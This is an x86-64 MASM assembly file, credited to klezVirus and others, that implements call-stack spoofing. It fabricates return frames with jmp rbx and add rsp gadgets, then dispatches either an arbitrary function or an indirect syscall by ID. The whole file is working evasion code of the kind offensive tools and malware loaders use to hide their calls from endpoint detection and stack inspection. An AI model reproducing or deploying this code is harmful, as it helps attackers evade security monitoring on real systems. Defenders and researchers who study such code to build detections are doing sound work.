; Great portions of the asm code below has been obtained from https://github.com/klezVirus.
; All credits to @KlezVirus @trickster012 @waldoirc and @namazso for developing the original PoC of this technique.
.data

SPOOFER STRUCT

    FirstFrameFunctionPointer       DQ 1
    SecondFrameFunctionPointer      DQ 1
    JmpRbxGadget                    DQ 1
    AddRspXGadget                   DQ 1

    FirstFrameSize                  DQ 1
    SecondFrameSize                 DQ 1
    JmpRbxGadgetFrameSize           DQ 1
    AddRspXGadgetFrameSize          DQ 1

    StackOffsetWhereRbpIsPushed     DQ 1

    SpoofFunctionPointer            DQ 1
    ReturnAddress                   DQ 1

    Nargs                           DQ 1
    Arg01                           DQ 1
    Arg02                           DQ 1
    Arg03                           DQ 1
    Arg04                           DQ 1
    Arg05                           DQ 1
    Arg06                           DQ 1
    Arg07                           DQ 1
    Arg08                           DQ 1
    Arg09                           DQ 1
    Arg10                           DQ 1
    Arg11                           DQ 1

    Sys                           DD 0
    SysId                           DD 0

SPOOFER ENDS

.code

get_current_rsp proc
	mov rax, rsp
	add rax, 8
	ret
get_current_rsp endp

spoof_call proc

	mov     [rsp+08h], rbp
	mov     [rsp+10h], rbx
	mov     rbp, rsp

	lea     rax, restore
	push    rax

	lea     rbx, [rsp]

	push    [rcx].SPOOFER.FirstFrameFunctionPointer                                     
	
	mov     rax, [rcx].SPOOFER.ReturnAddress
	sub     rax, [rcx].SPOOFER.FirstFrameSize
	
	sub     rsp, [rcx].SPOOFER.SecondFrameSize
	mov     r10, [rcx].SPOOFER.StackOffsetWhereRbpIsPushed
	mov     [rsp+r10], rax 

	push    [rcx].SPOOFER.SecondFrameFunctionPointer

	sub     rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
	push    [rcx].SPOOFER.JmpRbxGadget
	sub     rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize

	push    [rcx].SPOOFER.AddRspXGadget

	mov     r11, [rcx].SPOOFER.SpoofFunctionPointer
	jmp     parameter_handler
spoof_call endp
	
restore proc
	mov     rsp, rbp
	mov     rbp, [rsp+08h]
	mov     rbx, [rsp+10h]
	ret
restore endp

parameter_handler proc
	cmp		[rcx].SPOOFER.Nargs, 11
	je		handle_eleven
	cmp		[rcx].SPOOFER.Nargs, 10
	je		handle_ten
	cmp		[rcx].SPOOFER.Nargs, 9
	je		handle_nine
	cmp		[rcx].SPOOFER.Nargs, 8
	je		handle_eight
	cmp		[rcx].SPOOFER.Nargs, 7
	je		handle_seven
	cmp		[rcx].SPOOFER.Nargs, 6
	je		handle_six
	cmp		[rcx].SPOOFER.Nargs, 5
	je		handle_five
	cmp		[rcx].SPOOFER.Nargs, 4
	je		handle_four
	cmp		[rcx].SPOOFER.Nargs, 3
	je		handle_three
	cmp		[rcx].SPOOFER.Nargs, 2
	je		handle_two
	cmp		[rcx].SPOOFER.Nargs, 1
	je 		handle_one
	cmp		[rcx].SPOOFER.Nargs, 0
	je 		handle_none
parameter_handler endp

handle_eleven proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg11
	mov		[rsp+60h], r15
	pop		r15
	jmp		handle_ten
handle_eleven endp
handle_ten proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg10
	mov		[rsp+58h], r15
	pop		r15
	jmp		handle_nine
handle_ten endp
handle_nine proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg09
	mov		[rsp+50h], r15
	pop		r15
	jmp		handle_eight
handle_nine endp
handle_eight proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg08
	mov		[rsp+48h], r15
	pop		r15
	jmp		handle_seven
handle_eight endp
handle_seven proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg07
	mov		[rsp+40h], r15
	pop		r15
	jmp		handle_six
handle_seven endp
handle_six proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg06
	mov		[rsp+38h], r15
	pop		r15
	jmp		handle_five
handle_six endp
handle_five proc
	push	r15
	mov		r15, [rcx].SPOOFER.Arg05
	mov		[rsp+30h], r15
	pop		r15
	jmp		handle_four
handle_five endp
handle_four proc
	mov		r9, [rcx].SPOOFER.Arg04
	jmp		handle_three
handle_four endp
handle_three proc
	mov		r8, [rcx].SPOOFER.Arg03
	jmp		handle_two
handle_three endp
handle_two proc
	mov		rdx, [rcx].SPOOFER.Arg02
	jmp		handle_one
handle_two endp
handle_one proc
	cmp		[rcx].SPOOFER.Sys, 0
	jne		execute_syscall
	mov		rcx, [rcx].SPOOFER.Arg01
	jmp		handle_none
handle_one endp

handle_none proc
	jmp		execute
handle_none endp

execute proc
	jmp     qword ptr r11
execute endp

execute_syscall proc
	mov 	r10, [rcx].SPOOFER.Arg01
	mov 	eax, [rcx].SPOOFER.SysId
	mov 	rcx, [rcx].SPOOFER.Arg01
	jmp 	qword ptr r11
execute_syscall endp

end